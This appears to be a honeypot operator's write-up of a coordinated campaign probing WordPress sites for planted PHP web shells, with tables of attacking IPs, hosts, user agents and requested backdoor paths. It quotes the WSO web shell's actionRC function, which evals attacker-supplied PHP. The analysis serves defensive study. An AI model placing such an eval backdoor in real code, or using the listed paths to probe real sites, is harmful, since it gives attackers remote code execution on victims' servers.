# Vigilante Campaign

A [Vigilance Committee](vigilante_suspected/) campaign from many IP addresses,
targeting many URLs on my web site.
Includes coordinated probing and attacks.

     138848 application/x-www-form-urlencoded
      59393 application/x-www-form-urlencoded;
         66 application/x-www-form-urlencoded;charset=UTF-8
         20 application/xml
        162 multipart/form-data,
       2581 multipart/form-data;
        725 text/html
         17 text/html;
          3 text/plain
      15086 text/xml
        197 text/xml;
         87 xml


|Timestamp|From IP address|DNS Name|From TCP port|p0f3 OS guess|
|---------|:--------------|-------:|-------------|-------------:|
|2019-06-30T03:58:30.933-0600|192.111.154.98|none|63360|Linux 3.11 and newer|
|2019-06-30T03:58:32.007-0600|192.185.131.125|mx48.hostgator.mx|10700|Linux 3.11 and newer|
|2019-06-30T03:59:13.079-0600|115.29.99.145|none|49323|Linux 2.6.x|
|2019-06-30T03:59:53.019-0600|50.87.144.172|gator3136.hostgator.com|17226|Linux 3.11 and newer|
|2019-06-30T04:00:33.042-0600|47.254.89.228|none|35294|Linux 3.11 and newer|
|2019-06-30T04:00:34.109-0600|50.87.144.192|sknnaturals.com|39026|Linux 3.11 and newer|
|2019-06-30T04:00:34.839-0600|162.251.80.12|cp-1.webhostbox.net|34540|Linux 3.11 and newer|
|2019-06-30T04:00:35.773-0600|198.57.247.245|gator3281.hostgator.com|24452|Linux 3.11 and newer|
|2019-06-30T04:00:36.628-0600|94.46.168.170|cp85.webserver.pt|54096|Linux 3.11 and newer|
|2019-06-30T04:00:38.237-0600|69.89.31.97|box297.bluehost.com|39935|Linux 3.11 and newer|
|2019-06-30T04:00:38.753-0600|67.220.182.98|zanskar.iabhost.com|43348|Linux 3.11 and newer|
|2019-06-30T04:00:39.339-0600|108.167.189.44|searscommercial.us|28231|Linux 3.11 and newer|
|2019-06-30T04:00:41.477-0600|69.195.124.155|box955.bluehost.com|38833|Linux 3.11 and newer|
|2019-06-30T04:00:43.035-0600|210.211.125.204|none|41648|Linux 3.11 and newer|
|2019-06-30T04:00:44.099-0600|192.185.2.118|accord.websitewelcome.com|44723|Linux 3.11 and newer|
|2019-06-30T04:00:45.974-0600|50.87.248.201|box1201.bluehost.com|56105|Linux 3.11 and newer|
|2019-06-30T04:00:47.275-0600|162.241.244.141|box5202.bluehost.com|58662|Linux 3.11 and newer|
|2019-06-30T04:00:48.697-0600|192.185.4.87|gator4076.hostgator.com|12388|Linux 3.11 and newer|



|From IP address|Content-Type |Accept-Language|Connection|User-Agent |
|:--------------|-------------:|---------------|-------------|:-------------|
|192.111.154.98|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G935F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36|
|192.185.131.125|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36|
|115.29.99.145|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063|
|50.87.144.172|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10|
|47.254.89.228|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1|
|50.87.144.192|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0|
|162.251.80.12|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1|
|198.57.247.245|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1|
|94.46.168.170|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36|
|69.89.31.97|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36|
|67.220.182.98|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1|
|108.167.189.44|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko|
|69.195.124.155|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36|
|210.211.125.204|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko|
|192.185.2.118|application/x-www-form-urlencoded|en-US,en;q=0.8|close|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36|
|50.87.248.201|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko|
|162.241.244.141|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko|
|192.185.4.87|application/x-www-form-urlencoded|en-US,en;q=0.8||Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko|


Every URL invoked as HTTP/1.0, highly unlikely these are browser requests,
they universally use HTTP/1.1 unless told otherwise.
It appears that some of the requests came with a "Connection: close" header.
That's not at all common to send with HTTP/1.0.
All HTTP servers probably ignore it.


|Arrival Time|From IP Address| URL |p1 parameter data|p1 empty response|
|------------|:--------------|:----|----|-----|
|2019-06-30T03:58:30.933-0600|192.111.154.98|/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/ps.php||X|
|2019-06-30T03:58:32.007-0600|192.185.131.125|/wp-content/uploads/2015/11/mod_arcweb.php|||
|2019-06-30T03:59:13.079-0600|115.29.99.145|/wp-content/uploads/2015/11/mod_arcweb.php|||
|2019-06-30T03:59:53.019-0600|50.87.144.172|/wp-content/uploads/2015/11/mod_arcweb.php|||
|2019-06-30T04:00:33.042-0600|47.254.89.228|/blog/wp-content/themes/twentytwelve/404.php||X|
|2019-06-30T04:00:34.109-0600|50.87.144.192|/wordpress/wp-content/plugins/wp-mobile-detector/cache/dbd.php||X|
|2019-06-30T04:00:34.839-0600|162.251.80.12|/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php||X|
|2019-06-30T04:00:35.773-0600|198.57.247.245|/wp-content/plugins/apikey/settings.php||X|
|2019-06-30T04:00:36.628-0600|94.46.168.170|/wordpress/wp-content/plugins/wp-mobile-detector/cache/db.php||X|
|2019-06-30T04:00:38.237-0600|69.89.31.97|/wordpress/wp-content/plugins/wp-mobile-detector/cache/db.php||X|
|2019-06-30T04:00:38.753-0600|67.220.182.98|/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php||X|
|2019-06-30T04:00:39.339-0600|108.167.189.44|/blog/wp-content/plugins/wp_bing/wp-ajax.php||X|
|2019-06-30T04:00:41.477-0600|69.195.124.155|/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/ps.php|X||
|2019-06-30T04:00:43.035-0600|210.211.125.204|/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/ps.php|X||
|2019-06-30T04:00:44.099-0600|192.185.2.118|/blog/wp-content/themes/twentytwelve/404.php|X||
|2019-06-30T04:00:45.974-0600|50.87.248.201|/wordpress/wp-content/plugins/wp-mobile-detector/cache/dbd.php|X||
|2019-06-30T04:00:47.275-0600|162.241.244.141|/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php|X||
|2019-06-30T04:00:48.697-0600|192.185.4.87|/wp-content/plugins/apikey/settings.php|X||

WSO's RC action is peculiar:

    function actionRC()
    {
        if (!@$_POST['p1']) {
            $a = array(
				'uname' => php_uname(),
				'php_version' => phpversion(),
				'wso_version' => WSO_VERSION,
				'safemode' => @ini_get('safe_mode')
			);
            echo serialize($a);
        } else {
            eval($_POST['p1']);
        }
    }

If WSO gets invoked with just a POST parameter named "a" with a value of "RC",
WSO sends back valuable information about the compromised system,
what version of PHP it runs,
the version of WSO itself.


If WSO gets invoked with a POST parameter named "a" with a value of "RC",
and a parameter named "p1" that contains PHP code,
that PHP code gets immediately eval'ed.

This invocation of WSO is easily automated with `curl` (or PHP's curl lib builtins),
serves as both quick recon,
and an immediate-evaluation backdoor.

My honey pot WSO emulator also emulates a number of other backdoors if it finds
it's invoked with specific URLs or with special parameters.
The 2019-06-30T03:58:32.007-0600, 2019-06-30T03:59:13.079-0600 and 2019-06-30T03:59:53.019-0600
invocations had a URL ending in `mod_arcweb.php`.
My website is apparently named in some underground "sibpanel" shell lists as compromised
with a [fack-and-key backdoor](/backdoors/fack).
Many IP addresses invoke URLs ending in `mod_arcweb.php` as a fack-and-key backdoor,
usually with a large amount of PHP to run,
and they're unusually aggressive about trying and retrying and retrying...
In order to not devote my web site as a backup server for these morons,
I've put a delay in my WSO emultor for fack-and-key URLs.
